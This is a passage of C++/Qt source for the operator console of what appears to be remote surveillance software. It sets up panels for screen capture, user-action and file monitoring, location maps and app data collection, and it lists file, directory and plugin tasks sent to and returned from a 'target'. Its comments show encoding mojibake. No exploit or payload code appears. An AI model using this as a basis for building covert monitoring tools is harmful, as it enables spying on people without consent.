		m_captureDlg = new CaptureDlg(ui.frmCapture, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmCapture);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_captureDlg);

		connect(m_captureDlg, SIGNAL(emitModify()), this, SLOT(ModifyCapturePolicy()));
		bScreen = true;
		InitCustomText(m_captureDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ������Ƶ���
//
void TargetDlg::InitMultimedia()
{
	if ( !this->bMultimedia )
	{
		m_multimediaDlg = new MultimediaDlg(ui.frmMultiMedia, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmMultiMedia);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_multimediaDlg);
		bMultimedia = true;
		InitCustomText(m_multimediaDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ���û���Ϊ���
//
void TargetDlg::InitUserActionMonitor()
{
	if ( !this->bUserAction )
	{
		m_userActionDlg = new UserActionDlg(ui.frmUserAction, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmUserAction);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_userActionDlg);
		this->bUserAction = true;
		InitCustomText(m_userActionDlg);
	}
	
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ���߼��ļ����
//
void TargetDlg::InitAdvanceFileMonitor()
{
	if (bAdvanceFileMonitor == false)
	{
		m_advanceMonitorDlg = new AdvanceMonitorDlg(ui.frmAdvanceMonitor, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmAdvanceMonitor);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_advanceMonitorDlg);
		this->bAdvanceFileMonitor = true;
		InitCustomText(m_advanceMonitorDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ����������־
//
void TargetDlg::InitLogInfo()
{
	if ( !this->bLogInfo )
	{
		m_logDetailDlg = new LogDetailDlg(ui.frmLog, this->tarBlock);
		connect(this, SIGNAL(emitRefreshOnlineLogInfo()), m_logDetailDlg, SLOT(RefreshOnlineLogInfo()));
		QHBoxLayout* layout = new QHBoxLayout(ui.frmLog);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_logDetailDlg);
		this->bLogInfo = true;
		InitCustomText(m_logDetailDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ����ͼ
//
void TargetDlg::InitMapInfo()
{
	if ( !this->bMapInfo )
	{
		m_mapInfoDlg = new MapInfoDlg(ui.frmMapInfo, tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmMapInfo);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_mapInfoDlg);
		bMapInfo = true;
		InitCustomText(m_mapInfoDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ��Ӧ��ȡ֤
//
void TargetDlg::InitAppInfo()
{
	if ( !this->bAppInfo )
	{
		m_appInfoDlg = new AppInfoDlg(this, tarBlock->m_sysType, tarBlock->widDiskDataDir);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmAppInfo);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_appInfoDlg);

		connect(m_appInfoDlg, SIGNAL(emitGetAppData()), this, SLOT(GetAppData()));
		connect(m_appInfoDlg, SIGNAL(emitCleanData()), this, SLOT(CleanAppData()));
		connect(m_appInfoDlg, SIGNAL(emitExportData()), this, SLOT(ExportAppData()));
		bAppInfo = true;
		InitCustomText(m_appInfoDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ���������������
//
void TargetDlg::InitThirdPlugin()
{
	if ( !this->bThirdPlugin )
	{
		m_thirdPluginDlg = new ThirdPluginDlg(this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmThirdPlugin);
		layout->addWidget(m_thirdPluginDlg);
		bThirdPlugin = true;
		InitCustomText(m_thirdPluginDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ʼ��¼����Ϣ
//
void TargetDlg::InitRecordInfo()
{
	if ( !this->bRecord )
	{
		m_recordDlg = new RecordDlg(this, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmRecord);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_recordDlg);
		bRecord = true;
		InitCustomText(m_recordDlg);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ȡ��ǰ�����б�
//
QTableWidget* TargetDlg::GetActiveFTListView()
{
	QTableWidget* table = NULL;

	switch ( ui.stkMissionStatus->currentIndex() )
	{

	case 0:
		table = ui.tbUploadFileList;
		break;

	case 1:
		table = ui.tbDownloadFileList;
		break;

	case 2:
		if ( ui.tbDirCommand->selectedItems().count() > 0 )
		{
			table = ui.tbDirCommand;
		}
		else
		{
			table = ui.tbFileCommand;
		}
		break;

	case 3:
		table = ui.tbDirInfoList;
		break;

	case 4:
		table = ui.tbUploadPluginList;
		break;

	case 5:
		table = ui.tbPluginData;
		break;
	}

	return table;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����������б�
//
void TargetDlg::AddFileTaskToListView(FileTask *fileTask)
{
	QTableWidgetItem* item = NULL;
	QTableWidgetItem* parItem = NULL;

	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:

		// �ļ��ϴ�
		if (fileTask->taskDirect == FILEUP)
		{
			item = AddFileDataTaskToListView(fileTask, ui.tbUploadFileList);
		}
		// ����
		else
		{
			item = AddFileDataTaskToListView(fileTask, ui.tbDownloadFileList);
		}
		break;

    case TASK_PLUGINDATA:
        item = AddPluginDataTaskToListView(fileTask);
        break;
		//
		//    case TASK_PLUGINUPT:
		//        li = AddPluginUptTaskToListView(fileTask);
		//        break;
		//
		//    case TASK_SEARCHINFO:
		//        // �����첽������FildTask��DirTaskͬ��һ��ListItem
		//        // ������ʱ������������ӣ�ֻ�ǽ���״̬���¼���
		//        //
		//        li = QueryFileTaskListItem(fileTask, NULL, NULL);
		//        if (li)
		//        {
		//            li->SubItems->Strings[3] = WideString(fileTask->dwTotalLen);
		//        }
		//        return;
		//                
	case TASK_DIRINFO:
		// ���ڶ��Ŀ¼��Ϣ��ȡ��FileTask��DirTaskͬ��һ��ListItem
		// ������ʱ������������ӣ�ֻ�ǽ���״̬���¼���
		//
		item = QueryFileTaskListItem(fileTask, NULL, NULL);
		if (item)
		{
			item->tableWidget()->item(item->row(), 4)->setText(QString("%1").arg(fileTask->dwTotalLen));
		}
		return;

	case TASK_DIRFILE:

		{
			// ֻ��Ŀ¼ָ��ѡ�У������丸ָ��Ż���ӵ�ListView��
			//
			QList<QTableWidgetItem*> items = ui.tbDirCommand->selectedItems();

			if ( 0 != items.count() )
			{
				parItem = ui.tbDirCommand->item(items.at(0)->row(), 0);

				PDirTask lpDirTask = (PDirTask)parItem->data(Qt::UserRole).toUInt();
				if (lpDirTask->dwTaskID == fileTask->dwParentID)
				{   
					item = AddFileDataTaskToListView(fileTask, ui.tbFileCommand);                
				}
			}
		}
		break;

	case TASK_PLUGINUPT:
		item = AddPluginUptTaskToListView(fileTask);
		break;

	default:
		break;
	}

	if (item == NULL)
	{
		return;
	}

	item->setData(Qt::UserRole, (unsigned int)fileTask);

	return;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����ļ��������б�
//
QTableWidgetItem* TargetDlg::AddFileDataTaskToListView(FileTask *fileTask, QTableWidget* list)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* fileName = new QTableWidgetItem;
	QTableWidgetItem* localPath = new QTableWidgetItem;
	QTableWidgetItem* targetPath = new QTableWidgetItem;
	QTableWidgetItem* totalLen = new QTableWidgetItem;
	QTableWidgetItem* daeProgress = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	targetPath->setTextAlignment(Qt::AlignLeft | Qt::AlignVCenter);
	//fileName->setTextAlignment(Qt::AlignCenter);
	totalLen->setTextAlignment(Qt::AlignCenter);
	daeProgress->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	id->setText(QString("%1").arg(fileTask->dwTaskID));

	if (fileTask->taskDirect == FILEUP)
	{
		fileName->setText(QString::fromStdWString(ExtractFileNameW(fileTask->ctrPathW.c_str())));
		localPath->setText(QString::fromStdWString(fileTask->ctrPathW));
		targetPath->setText(QString::fromStdWString(fileTask->tarPathW));
	}
	else
	{
		/*if ( this->tarBlock->m_isMac )
		{
			targetPath->setText(QString::fromStdWString(ExtractFileNameMac(fileTask->tarPathW.c_str())));
		}
		else
		{
			targetPath->setText(QString::fromStdWString(ExtractFileNameW(fileTask->tarPathW.c_str())));
		}*/

		targetPath->setText(QString::fromStdWString(fileTask->tarPathW.c_str()));

		if (wcscmp(fileTask->ctrPathW.c_str(), L"..") == 0)
		{
			localPath->setText(QString::fromLocal8Bit("�������ݷ���Ŀ¼"));
		}
		else
		{
			localPath->setText(QString::fromStdWString(fileTask->ctrPathW));
		}
	}

	totalLen->setText(QString("%1").arg(fileTask->dwTotalLen));

	if (0 != fileTask->dwTotalLen)
	{
		progress->setText(QString("%1%").arg(fileTask->nFinishedProp));
		daeProgress->setText(QString("%1%").arg(fileTask->nDaemonedProp));
	}
	else
	{
		if (fileTask->taskStatus == FINISHED)
		{
			progress->setText("100%");
			daeProgress->setText("100%");
		}
		else
		{
			progress->setText("0%");
			daeProgress->setText("0%");
		}
	}

	if (fileTask->dwErrorID)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	int insertRow = 0;
	//if ( list == ui.tbFileCommand )
	//{
		insertRow = list->rowCount();
	//}

	list->insertRow(insertRow);

	if (fileTask->taskDirect == FILEUP)
	{
		list->setItem(insertRow, 0, status);
		list->setItem(insertRow, 1, id);
		list->setItem(insertRow, 2, fileName);
		list->setItem(insertRow, 3, localPath);
		list->setItem(insertRow, 4, targetPath);
		list->setItem(insertRow, 5, totalLen);
		list->setItem(insertRow, 6, progress);
		list->setItem(insertRow, 7, remark);
	}
	else
	{
		list->setItem(insertRow, 0, status);
		list->setItem(insertRow, 1, id);
		list->setItem(insertRow, 2, targetPath);
		list->setItem(insertRow, 3, localPath);
		list->setItem(insertRow, 4, totalLen);
		list->setItem(insertRow, 5, daeProgress);
		list->setItem(insertRow, 6, progress);
		list->setItem(insertRow, 7, remark);
	}

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ѯ�ļ���������Ӧ�� item
//
QTableWidgetItem* TargetDlg::QueryFileTaskListItem(FileTask *fileTask, int* lpnDaeIndex,int* lpnFinIndex)
{
	QTableWidget* table = NULL;

	if (lpnFinIndex)
	{
		*lpnFinIndex = 6;
		*lpnDaeIndex = 5;

		if (fileTask->taskType == TASK_PLUGINUPT)
		{
			*lpnFinIndex = 5;
			*lpnDaeIndex = 4;
		}
		else if (fileTask->taskType == TASK_PLUGINDATA)
		{
			*lpnFinIndex = 7;
			*lpnDaeIndex = 6;
		}
		else if (fileTask->taskType == TASK_FILEDATA)
		{
			if (fileTask->taskDirect == FILEUP)
			{
				*lpnFinIndex = 7;
				*lpnDaeIndex = 6;
			}
			else
			{
				*lpnFinIndex = 6;
				*lpnDaeIndex = 5;
			}
		}
		else if (fileTask->taskType == TASK_DIRINFO)
		{
			*lpnFinIndex = 6;
			*lpnDaeIndex = 5;
		}
	}

	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
		if (fileTask->taskDirect == FILEUP)
		{
			table = ui.tbUploadFileList;
		}
		else
		{
			table = ui.tbDownloadFileList;
		}
		break;
	case TASK_PLUGINDATA:
		table = ui.tbPluginData;
		break;
	case TASK_PLUGINUPT:
		table = ui.tbUploadPluginList;
		break;
	case TASK_DIRINFO:
		table = ui.tbDirInfoList;
		break;
	case TASK_DIRFILE:
		table = ui.tbFileCommand;
		break;
		//case TASK_SEARCHINFO:
		//tntlv = this->tntlvSearchData;
		//break;
	default:
		break;
	}

	int i = 0;
	QTableWidgetItem* item = NULL;

	// ����TASK_DIRFILE��������ģ�������Ҫ���tntlvDirDown
	//
	if (fileTask->taskType == TASK_DIRFILE)
	{
		QList<QTableWidgetItem*> items = ui.tbDirCommand->selectedItems();

		if ( 0 == items.count() )
		{
			return NULL;
		}

		QTableWidgetItem* item = ui.tbDirCommand->item(items.at(0)->row(), 0);
		DirTask *lpDirTask = (PDirTask)item->data(Qt::UserRole).toUInt();
		if (lpDirTask->dwTaskID != fileTask->dwParentID)
		{
			return NULL;
		}
	}

	i = 0;

	if ( NULL == table )
		return NULL;

	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 1);

		// ���Ŀ¼��Ϣ��ȡ��Զ�������������
		//
		if (fileTask->taskType == TASK_DIRINFO)
		{
			DirTask *lpDirTask = (PDirTask)item->data(Qt::UserRole).toUInt();
			if (lpDirTask)
			{
				if (fileTask->dwParentID == lpDirTask->dwTaskID)
				{
					break;
				}
			}
		}
		else if (fileTask->taskType == TASK_SEARCHINFO)
		{
			SearchTask *lpSearchTask = (PSearchTask)item->data(Qt::UserRole).toUInt();
			if (lpSearchTask)
			{
				if (fileTask->dwParentID == lpSearchTask->dwTaskID)
				{
					break;
				}
			}
		}
		else
		{
			// �˴���Ϊ���� taskId �ж�
			if (fileTask->dwTaskID == item->text().toUInt())
			{
				break;
			}
		}
	}

	if ( i == table->rowCount() )
	{ 
		return NULL;
	}

	return item;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���Ŀ¼�������б�
//
void TargetDlg::AddDirTaskToListView(DirTask *dirTask)
{

	if (dirTask->dwAutoDown == 0)
	{
		AddDirInfoTaskToListView(dirTask);
	}
	else
	{
		AddDirDownTaskToListView(dirTask);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���Ŀ¼��Ϣ��ȡ�������б�
//
QTableWidgetItem* TargetDlg::AddDirInfoTaskToListView(DirTask *dirTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* tarDirPath = new QTableWidgetItem;
	QTableWidgetItem* level = new QTableWidgetItem;
	QTableWidgetItem* totalLen = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	//tarDirPath->setTextAlignment(Qt::AlignCenter);
	level->setTextAlignment(Qt::AlignCenter);
	totalLen->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)dirTask->taskStatus)));
	id->setText(QString("%1").arg(dirTask->dwTaskID));
	tarDirPath->setText(QString::fromStdWString(dirTask->tarDirPathW));

	if (dirTask->dwLevel == 0)
	{
		level->setText(QString::fromLocal8Bit("ȫ��"));
	}
	else
	{
		level->setText(QString("%1").arg(dirTask->dwLevel));
	}

	PFileTask lpFileTask = dirTask->lpInfoFileTask;
	if (lpFileTask == NULL)
	{
		totalLen->setText("");
		progress->setText("");
	}
	else
	{
		totalLen->setText(QString("%1").arg(lpFileTask->dwTotalLen));
		progress->setText(QString("%1%").arg(lpFileTask->nFinishedProp));
	}

	if (dirTask->dwErrorID > 0)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	status->setData(Qt::UserRole, (unsigned int)dirTask);

	ui.tbDirInfoList->insertRow(0);
	ui.tbDirInfoList->setItem(0, 0, status);
	ui.tbDirInfoList->setItem(0, 1, id);
	ui.tbDirInfoList->setItem(0, 2, tarDirPath);
	ui.tbDirInfoList->setItem(0, 3, level);
	ui.tbDirInfoList->setItem(0, 4, totalLen);
	ui.tbDirInfoList->setItem(0, 5, progress);
	ui.tbDirInfoList->setItem(0, 6, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���Ŀ¼�����������б�
//
QTableWidgetItem* TargetDlg::AddDirDownTaskToListView(DirTask *dirTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* tarDirPath = new QTableWidgetItem;
	QTableWidgetItem* level = new QTableWidgetItem;
	QTableWidgetItem* running = new QTableWidgetItem;
	QTableWidgetItem* paused = new QTableWidgetItem;
	QTableWidgetItem* finished = new QTableWidgetItem;
	QTableWidgetItem* canceled = new QTableWidgetItem;
	QTableWidgetItem* failed = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	//tarDirPath->setTextAlignment(Qt::AlignCenter);
	level->setTextAlignment(Qt::AlignCenter);
	running->setTextAlignment(Qt::AlignCenter);
	paused->setTextAlignment(Qt::AlignCenter);
	finished->setTextAlignment(Qt::AlignCenter);
	canceled->setTextAlignment(Qt::AlignCenter);
	failed->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)dirTask->taskStatus)));
	id->setText(QString("%1").arg(dirTask->dwTaskID));
	tarDirPath->setText(QString::fromStdWString(dirTask->tarDirPathW));

	if (dirTask->dwLevel == 0)
	{
		level->setText(QString::fromLocal8Bit("ȫ��"));
	}
	else
	{
		level->setText(QString("%1").arg(dirTask->dwLevel));
	}

	running->setText(QString("%1").arg(dirTask->dwWorkingCount));
	paused->setText(QString("%1").arg(dirTask->dwPausedCount));
	finished->setText(QString("%1").arg(dirTask->dwFinishedCount));
	canceled->setText(QString("%1").arg(dirTask->dwCanceledCount));
	failed->setText(QString("%1").arg(dirTask->dwErroredCount));

	if (dirTask->dwErrorID)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	status->setData(Qt::UserRole, (unsigned int)dirTask);

	ui.tbDirCommand->insertRow(0);

	ui.tbDirCommand->setItem(0, 0, status);
	ui.tbDirCommand->setItem(0, 1, id);
	ui.tbDirCommand->setItem(0, 2, tarDirPath);
	ui.tbDirCommand->setItem(0, 3, level);
	ui.tbDirCommand->setItem(0, 4, running);
	ui.tbDirCommand->setItem(0, 5, paused);
	ui.tbDirCommand->setItem(0, 6, finished);
	ui.tbDirCommand->setItem(0, 7, canceled);
	ui.tbDirCommand->setItem(0, 8, failed);
	ui.tbDirCommand->setItem(0, 9, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��Ӳ�����ݻش��������б�
//
QTableWidgetItem* TargetDlg::AddPluginDataTaskToListView(FileTask* fileTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* taskId = new QTableWidgetItem;
	QTableWidgetItem* pluginId = new QTableWidgetItem;
	QTableWidgetItem* pluginName = new QTableWidgetItem;
	QTableWidgetItem* tarPath = new QTableWidgetItem;
	QTableWidgetItem* len = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	taskId->setTextAlignment(Qt::AlignCenter);
	pluginId->setTextAlignment(Qt::AlignCenter);
	pluginName->setTextAlignment(Qt::AlignCenter);
	//tarPath->setTextAlignment(Qt::AlignCenter);
	len->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	taskId->setText(tr("%1").arg(fileTask->dwTaskID));
	pluginId->setText(tr("%1").arg(fileTask->dwPluginID));
	pluginName->setText(QString::fromStdWString(ConvertPluginIdToLangW(fileTask->dwPluginID)));
	tarPath->setText(QString::fromStdWString(fileTask->tarPathW));
	len->setText(tr("%1").arg(fileTask->dwTotalLen));
	progress->setText("0%");

	if ( fileTask->dwErrorID )
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}

	int row = ui.tbPluginData->rowCount();
	ui.tbPluginData->insertRow(row);
	ui.tbPluginData->setItem(row, 0, status);
	ui.tbPluginData->setItem(row, 1, taskId);
	ui.tbPluginData->setItem(row, 2, pluginId);
	ui.tbPluginData->setItem(row, 3, pluginName);
	ui.tbPluginData->setItem(row, 4, tarPath);
	ui.tbPluginData->setItem(row, 5, len);
	ui.tbPluginData->setItem(row, 6, progress);
	ui.tbPluginData->setItem(row, 7, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��Ӳ�������������б�
//
QTableWidgetItem* TargetDlg::AddPluginUptTaskToListView(FileTask* fileTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* taskId = new QTableWidgetItem;
	QTableWidgetItem* pluginId = new QTableWidgetItem;
	QTableWidgetItem* len = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	taskId->setTextAlignment(Qt::AlignCenter);
	pluginId->setTextAlignment(Qt::AlignCenter);
	len->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	taskId->setText(tr("%1").arg(fileTask->dwTaskID));
	pluginId->setText(tr("%1").arg(fileTask->dwPluginID));
	len->setText(tr("%1").arg(fileTask->dwTotalLen));
	progress->setText("0%");

	if ( fileTask->dwErrorID )
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}

	int row = ui.tbUploadPluginList->rowCount();
	ui.tbUploadPluginList->insertRow(row);
	ui.tbUploadPluginList->setItem(row, 0, status);
	ui.tbUploadPluginList->setItem(row, 1, taskId);
	ui.tbUploadPluginList->setItem(row, 2, pluginId);
	ui.tbUploadPluginList->setItem(row, 3, len);
	ui.tbUploadPluginList->setItem(row, 4, progress);
	ui.tbUploadPluginList->setItem(row, 5, remark);

	return status;
}


// ////////////////////////////////////////////////////////////////////////////////
// @private ��������������б�
//
void TargetDlg::AddSearchTaskToListView(SearchTask *searchTask)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��Ӹ��ļ����ļ�����б�
//
/*void TargetDlg::AddRootItemToFileStatusList(std::wstring path)
{
	QTableWidgetItem* item = ui.tbFileList->selectedItems()[0];
	item = ui.tbFileList->item(item->row(), 0);

	PFILE_BLOCK fileInfo = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();

	// ��� "�Ѽ���" �ı��
	// ��һ���ѱ�ռ�ã���ʹ�õڶ��е� data
	QTableWidgetItem* container = ui.tbFileList->item(item->row(), 1);
	container->setData(Qt::UserRole, MONITORING);

	QTreeWidgetItem* monitorItem = new QTreeWidgetItem;

	//
	// �ļ���
	//
	monitorItem->setText(0, QString::fromStdWString(fileInfo->widName));

	//
	// ·��
	//
	monitorItem->setText(1, QString::fromStdWString(path));

	//
	// ͼ��
	//

	if (fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		QFileIconProvider provider;
		monitorItem->setIcon(0, provider.icon(QFileIconProvider::Folder));
	}
	else
	{
		HICON hIcon = GetIconFromFileName(fileInfo->widName.c_str());

		monitorItem->setIcon(0, QIcon(QPixmap::fromWinHICON(hIcon)));  
		DestroyIcon(hIcon);
	}

	// ����
	if ( fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
	{
		monitorItem->setText(
			3, QString::fromStdWString(m_curMonitorType == L"*.*" ? L"�����ļ�" : m_curMonitorType));
	}

	// ʱ��
	SYSTEMTIME  systime;
	FILETIME    local;
	FileTimeToLocalFileTime((FILETIME*)&fileInfo->LastWriteTime, &local);
	FileTimeToSystemTime(&local,&systime);
	char time[MAX_PATH] = {0};
	sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
		systime.wDay ,systime.wHour ,systime.wMinute);
	monitorItem->setText(2, QString::fromLocal8Bit(time));

	// ������ļ��л����ļ�
	monitorItem->setData(0, Qt::UserRole, (unsigned int)fileInfo->FileAttributes);

	// ���������ݿ�
	DM->InsertFileMonitorList(
		this->tarBlock->dwTargetID,
		monitorItem->text(0).toStdWString(),
		monitorItem->text(1).toStdWString(),
		monitorItem->text(2).toStdWString(),
		monitorItem->text(3).toStdWString(),
		fileInfo->FileAttributes);

	ui.trFileStatus->addTopLevelItem(monitorItem);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��Ӹ��ļ���¼
//
void TargetDlg::AddRootItemRecordToFileStatusList(std::wstring path, LONGLONG time)
{
	QTreeWidgetItem* root = NULL;

	for (int i = 0; i < ui.trFileStatus->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trFileStatus->topLevelItem(i);
		if ( item->text(1).toStdWString() == path )
		{
			root = item;
			break;
		}
	}

	if ( NULL != root )
	{
		QTreeWidgetItem* newRecord = new QTreeWidgetItem;
		WCHAR wzRecordCount[MAX_PATH] = {0};
		wsprintf(wzRecordCount, L"�� %d ���޸�", root->childCount()+1);
		newRecord->setText(0, QString::fromStdWString(std::wstring(wzRecordCount)));
		newRecord->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newRecord->setText(2, QString::fromLocal8Bit(time));

		root->addChild(newRecord);

		// ���������ݿ�
		DM->InsertFileMonitorRecord(this->tarBlock->dwTargetID,
			newRecord->text(0).toStdWString(),
			newRecord->text(1).toStdWString(),
			newRecord->text(2).toStdWString()
			);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ������ļ���¼
//
void TargetDlg::AddSubItemRecordToFileStatusList(std::wstring path, LONGLONG time)
{
	QTreeWidgetItem* root = NULL;

	// ���������ļ���
	for (int i = 0; i < ui.trFileStatus->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trFileStatus->topLevelItem(i);

		if ( item->data(0, Qt::UserRole).toUInt() & FILE_ATTRIBUTE_DIRECTORY )
		{
			std::wstring dirPath = item->text(1).toStdWString();
			if ( FileInDir(path, dirPath) )
			{
				root = item;
				break;
			}
		}
	}

	if ( NULL == root )
	{
		return;
	}

	//
	// ��Ӽ�¼
	//

	// �Ȳ����Ƿ��Ѿ�����
	QTreeWidgetItem* sameItem = NULL;
	for (int i = 0; i < root->childCount(); i++)
	{
		QTreeWidgetItem* item = root->child(i);

		if ( item->text(1).toStdWString() == path )
		{
			sameItem = item;
			break;
		}
	}

	// �ҵ�������Ӽ�¼��û�ҵ�������½ڵ�
	if ( NULL != sameItem )
	{
		QTreeWidgetItem* newRecord = new QTreeWidgetItem;
		WCHAR wzRecordCount[MAX_PATH] = {0};
		wsprintf(wzRecordCount, L"�� %d ���޸�", sameItem->childCount()+1);
		newRecord->setText(0, QString::fromStdWString(std::wstring(wzRecordCount)));
		
		newRecord->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newRecord->setText(2, QString::fromLocal8Bit(time));

		sameItem->addChild(newRecord);

		// ��Ӽ�¼
		DM->InsertFileMonitorRecord(this->tarBlock->dwTargetID,
			newRecord->text(0).toStdWString(),
			newRecord->text(1).toStdWString(),
			newRecord->text(2).toStdWString());
	}
	else
	{
		QTreeWidgetItem* newItem = new QTreeWidgetItem;
		std::wstring name = UnixLike(tarBlock) ? GetNameFromPath(path, L'/') : GetNameFromPath(path, L'\\');
		newItem->setText(0, QString::fromStdWString(name));
		HICON hIcon = GetIconFromFileName(path.c_str());
		newItem->setIcon(0, QIcon(QPixmap::fromWinHICON(hIcon)));
		DestroyIcon(hIcon);

		newItem->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newItem->setText(2, QString::fromLocal8Bit(time));

		root->addChild(newItem);

		// ����½ڵ�
		DM->InsertFileMonitorList(this->tarBlock->dwTargetID,
			newItem->text(0).toStdWString(),
			newItem->text(1).toStdWString(),
			newItem->text(2).toStdWString(),
			L"",
			0);
	}
}*/

// ////////////////////////////////////////////////////////////////////////////////
// @private ����״̬����Ϣ
//
